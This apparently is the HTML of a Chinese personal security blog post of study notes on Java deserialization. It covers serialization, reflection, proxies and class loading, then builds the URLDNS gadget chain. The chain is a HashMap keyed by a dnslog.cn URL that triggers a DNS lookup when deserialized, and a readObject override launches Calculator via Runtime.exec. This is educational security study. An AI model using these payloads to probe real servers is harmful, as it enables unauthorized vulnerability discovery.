@@ -1,0 +1,441 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化（1）—— 基础入门 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化（1）—— 基础入门 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="写在前面
+这部分的内容主要对B站UP白日梦组长的Java反序列化漏洞系列教程的学习，非常好的教程，受益良多👍
+
+Java反序列化漏洞专题-基础篇
+Java反序列化CommonsCollections篇
+
+由于本人Java仅仅是Hello ..." />
+    <meta name="keywords" content="Java反序列化,JAVA" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化（1）—— 基础入门
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-08
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-fan-xu-lie-hua-1-ji-chu-ru-men.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="写在前面">写在前面</h1>
+<p>这部分的内容主要对B站UP白日梦组长的Java反序列化漏洞系列教程的学习，非常好的教程，受益良多👍</p>
+<ul>
+<li><a href="https://www.bilibili.com/video/BV16h411z7o9/">Java反序列化漏洞专题-基础篇</a></li>
+<li><a href="https://www.bilibili.com/video/BV1no4y1U7E1/">Java反序列化CommonsCollections篇</a></li>
+</ul>
+<p>由于本人Java仅仅是Hello World的水平，学习的过程大量借助ChatGPT的辅助，所以部分内容的理解可能会有偏差<br>
+<img src="https://skyblu3519.github.io/post-images/1696766374986.png" alt="" loading="lazy"></p>
+<p>但你也没法指正我哈哈😁</p>
+<p>Anyway, have fun~</p>
+<h1 id="基础知识">基础知识</h1>
+<h2 id="序列化反序列化">序列化/反序列化</h2>
+<p>重点是<code>ObjectOutputStream</code>类的<code>writeObject</code>方法将一个对象序列化为一个字符串，和<code>ObjectInputStream</code>类的<code>readObject</code>方法将一串字符串反序列化为一个对象。</p>
+<pre><code class="language-java">ObjectOutputStream out = new ObjectOutputStream(outputstream);
+out.writeObject(t);
+
+ObjectInputStream in = new ObjectInputStream(inputstream);
+Object obj = in.readObject();
+</code></pre>
+<p>注意，序列化的对象要继承Serializable接口。例子：<br>
+Person.java</p>
+<pre><code class="language-java">package secss;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+public class Person implements Serializable {
+    public String name = &quot;noname&quot;;
+    private int age = -1;
+
+    Person(){}
+    
+    public Person(String name, int age){
+        this.name = name;
+        this.age = age;
+    }
+
+    @Override
+    public String toString(){
+        return &quot;Person &quot; + name + &quot; is &quot; + age;
+    }
+
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException{
+        ois.defaultReadObject();
+        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);
+    }
+}
+
+</code></pre>
+<p>SerTest.java</p>
+<pre><code class="language-java">package secss;
+
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+
+public class SerTest {
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;persion.ser&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+    public static void main(String[] args) throws Exception{
+        Person p = new Person(&quot;sky&quot;, 18);
+//        System.out.println(p);
+        serialize(p);
+    }
+}
+</code></pre>
+<p>UnSerTest.java</p>
+<pre><code class="language-java">package secss;
+
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+
+public class UnSerTest {
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+    public static void main(String[] args) throws Exception{
+        Person p = (Person)unserialize(&quot;Persion.ser&quot;);
+        System.out.println(p);
+    }
+}
+</code></pre>
+<h2 id="反射">反射</h2>
+<p>获取一个原型类的方法</p>
+<pre><code class="language-java">Person p = new Person();
+Class c = p.getClass();		// 对一个实例使用getClass()方法
+Class c = Class.forName(&quot;secss.Person&quot;);	// 参数是完全限定的类名（带上包）
+Class&lt;?&gt; stringClass = String.class;	// 类名.class
+Class c = ClassLoader.getSystemClassLoader().loadClass(&quot;Pseron&quot;); 	// Classloader加载
+</code></pre>
+<p>而反射本质上是操作这个原型类。首先是实例化</p>
+<pre><code class="language-java">// 构造函数在没有参数的情况下直接用newInstance
+Person p0 = (Person) c.newInstance();    
+System.out.println(p0);
+
+// 构造函数在有参数的情况下，先用getConstructor获取构造函数
+Constructor personconstructor = c.getConstructor(String.class, int.class);  // 传入的参数是Class类型，对应形参的数据类型
+Person p1 = (Person) personconstructor.newInstance(&quot;sky&quot;, 18);	// 构造函数的用newInstance创建对象
+System.out.println(p1);
+</code></pre>
+<p>然后是操作属性，四个方法getField、getFields、getDeclaredField、getDeclaredFields</p>
+<pre><code class="language-java">Field[] personfields = c.getFields();   // 获取所有属性，无法获取私有类型
+for (Field f : personfields) {
+    System.out.println(f);
+}
+
+Field[] personDeclaredfields = c.getDeclaredFields();   // 获取所有属性，可以获取私有类型
+for (Field f : personDeclaredfields) {
+    System.out.println(f);
+}
+
+Field personage = c.getDeclaredField(&quot;age&quot;);	// 获取age属性
+personage.setAccessible(true);	// 因为是private，修改值要用setAccessible设置为True
+personage.set(p0, 100);		// 修改值，指定一个对象是必须的
+System.out.println(p0)		// 查看修改结果
+</code></pre>
+<p>然后是方法调用，和属性类似也有四个方法getMethod、getMethods、getDeclaredMethod、getDeclaredMethods</p>
+<pre><code class="language-java">Method personaction = c.getMethod(&quot;action&quot;, String.class);		// 同样要指定传入参数的类型
+personaction.invoke(p0, &quot;skyskysky&quot;);	// 第一个参数是对象
+</code></pre>
+<h2 id="动态代理">动态代理</h2>
+<p><code>newProxyInstance</code>——创建一个动态代理类，参数说明<br>
+<img src="https://skyblu3519.github.io/post-images/1696765684203.png" alt="" loading="lazy"></p>
+<p>例子：</p>
+<pre><code class="language-java">IUser user = new IUserImpl();
+
+IUser uu = (IUser)Proxy.newProxyInstance(
+        user.getClass().getClassLoader(),
+        new Class[]{IUser.class},	// 按照class数组的形式传
+        userproxy	// 一个InvocationHandler类
+);
+</code></pre>
+<p>然后写一个类继承InvocationHandler<br>
+<img src="https://skyblu3519.github.io/post-images/1696765700707.png" alt="" loading="lazy"></p>
+<p>代码</p>
+<pre><code class="language-java">package secss;
+
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Method;
+
+public class UserInvocationHandler implements InvocationHandler {
+    IUser user;
+    public UserInvocationHandler(){}
+
+    public UserInvocationHandler(IUser user){
+        this.user = user;	// 实例化的时候传入需要代理的对象
+    }
+
+    @Override
+    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
+        System.out.println(&quot;Invoke &quot; + method.getName());
+        method.invoke(user, args);
+        return null;
+    }
+}
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1696765716573.png" alt="" loading="lazy"><br>
+method使用方法和反射的一样</p>
+<p>动态代理的利用：动态代理类无论调用什么方法，都会走一遍invoke。</p>
+<h2 id="类加载">类加载</h2>
+<p><img src="https://skyblu3519.github.io/post-images/1696765757662.png" alt="" loading="lazy"><br>
+初始化：静态代码块<br>
+实例化（使用）：构造代码块、构造函数</p>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1696765775837.png" alt="" loading="lazy"></figure>
+<p>实验代码：</p>
+<pre><code class="language-java">Class c = Game.class;   // 只会加载类
+Class.forName(&quot;secss.Game&quot;);    // 默认会初始化类
+Class.forName(&quot;secss.Game&quot;, false, ClassLoader.getSystemClassLoader());     // 不会初始化
+ClassLoader cl = ClassLoader.getSystemClassLoader();
+cl.loadClass(&quot;secss.Game&quot;);     // 不进行初始化
+</code></pre>
+<p>Game类：</p>
+<pre><code class="language-java">public class Game {
+    public static int i = 1;
+    static {
+        System.out.println(&quot;静态代码块&quot;);
+    }
+    public static void staticAction(){
+        System.out.println(&quot;静态方法&quot;);
+    }
+    {
+        System.out.println(&quot;构造代码块&quot;);
+    }
+    public Game(){
+        System.out.println(&quot;无参构造方法&quot;);
+    }
+    public Game(int i){
+        System.out.println(&quot;有参构造方法&quot;);
+    }
+}
+</code></pre>
+<p>双亲委派流程<br>
+<img src="https://skyblu3519.github.io/post-images/1696765791017.png" alt="" loading="lazy"></p>
+<ol>
+<li>检查类是否已加载：首先，它调用findLoadedClass方法来检查该类是否已经被加载到内存中。如果已加载，则直接返回该类的Class对象。</li>
+<li>使用父类加载器：如果类还没有被加载，则检查是否有父类加载器存在。如果有，它会尝试使用父类加载器来加载这个类。如果父类加载器可以加载这个类，它就会这样做，否则，流程会继续。</li>
+<li>使用Bootstrap ClassLoader：如果没有父类加载器或父类加载器无法加载该类，那么将使用Bootstrap ClassLoader来尝试加载它。Bootstrap ClassLoader是JVM的一部分，它可以加载核心Java类库（比如java.lang.*）。</li>
+<li>使用当前类加载器的 findClass 方法：如果前面的步骤都失败了，那么它会调用当前类加载器的findClass方法来尝试加载这个类。这是你可以覆写的一个方法，以实现你自己的类加载逻辑。</li>
+<li>调用 defineClass 方法：如果findClass方法找到了类的字节码，它应该使用defineClass方法来注册这个类到JVM中。</li>
+<li>链接类：最后，如果loadClass方法被调用时传递的resolve参数是true，它还将调用resolveClass方法来链接这个类。链接确保类可以被正确使用，它涉及验证类文件和初始化静态变量等步骤。</li>
+</ol>
+<p>视频对下面这个调用链有详细的调试：<br>
+<img src="https://skyblu3519.github.io/post-images/1696765808014.png" alt="" loading="lazy"></p>
+<p>URLClassLoader 任意类加载:file/http/jar<br>
+ClassLoader.defineClass 字节码加载任意类 私有<br>
+Unsafe.defineClass 字节码加载 public 类不能直接生成 Spring 里面可以直接生成</p>
+<h1 id="一个简单的反序列化漏洞利用url-dns链">一个简单的反序列化漏洞利用——URL DNS链</h1>
+<p>入口类HashMap，重写了readObject<br>
+<img src="https://skyblu3519.github.io/post-images/1696765822880.png" alt="" loading="lazy"></p>
+<p>在解析key/value的部分调用了<code>hash</code>函数<br>
+<img src="https://skyblu3519.github.io/post-images/1696765849228.png" alt="" loading="lazy"></p>
+<p>在<code>hash</code>调用了key的<code>hashcode</code>方法<br>
+<img src="https://skyblu3519.github.io/post-images/1696765856468.png" alt="" loading="lazy"></p>
+<p>现在找一个类，它的hashCode方法存在利用点。</p>
+<p>URL类可以让你通过URL去连接网络服务器并获取资源，它的<code>hashCode</code>方法为<br>
+<img src="https://skyblu3519.github.io/post-images/1696765865219.png" alt="" loading="lazy"></p>
+<p>在hashCode值不为-1时（hashCode初始值为-1），会调用handler的<code>hashCode</code>方法，同时修改<code>hashCode</code>的值。</p>
+<p>跟进这个<code>hashCode</code>方法，有一个DNS解析的功能。<br>
+<img src="https://skyblu3519.github.io/post-images/1696765881752.png" alt="" loading="lazy"></p>
+<p>所以一个简单的利用就出来了</p>
+<pre><code class="language-java">HashMap&lt;URL, Integer&gt; h = new HashMap&lt;&gt;();
+h.put(new URL(&quot;http://p63utd.dnslog.cn/&quot;), 1);
+serialize(h);
+</code></pre>
+<p>但是这里存在一个问题，HashMap的put方法会调用一次<code>hashCode</code>方法。<br>
+<img src="https://skyblu3519.github.io/post-images/1696765906069.png" alt="" loading="lazy"></p>
+<p>它会将<code>hashCode</code>的值提前修改，进而无法在服务端执行<code>hashCode</code>方法。</p>
+<p>使用反射来解决这一问题</p>
+<pre><code class="language-java">HashMap&lt;URL, Integer&gt; h = new HashMap&lt;&gt;();
+URL url = new URL(&quot;http://sk555.t0vgmg.dnslog.cn/&quot;);
+
+Class c = url.getClass();
+Field hashCodeField = c.getDeclaredField(&quot;hashCode&quot;);
+hashCodeField.setAccessible(true);
+
+hashCodeField.set(url, 555);	// 在put前修改hashCode的值，避免序列化的时候本地发起DNS请求
+h.put(url, 1);
+hashCodeField.set(url, -1);		// put之后改为-1
+
+serialize(h);
+</code></pre>
+<p>HashMap.readObject -&gt; URL.hashCode()</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">写在前面</a></li>
+<li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a>
+<ul>
+<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">序列化/反序列化</a></li>
+<li><a href="#%E5%8F%8D%E5%B0%84">反射</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">动态代理</a></li>
+<li><a href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD">类加载</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8url-dns%E9%93%BE">一个简单的反序列化漏洞利用——URL DNS链</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/nodejs-sha-xiang-tao-yi/">
+              <h3 class="post-title">
+                NodeJS沙箱逃逸
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
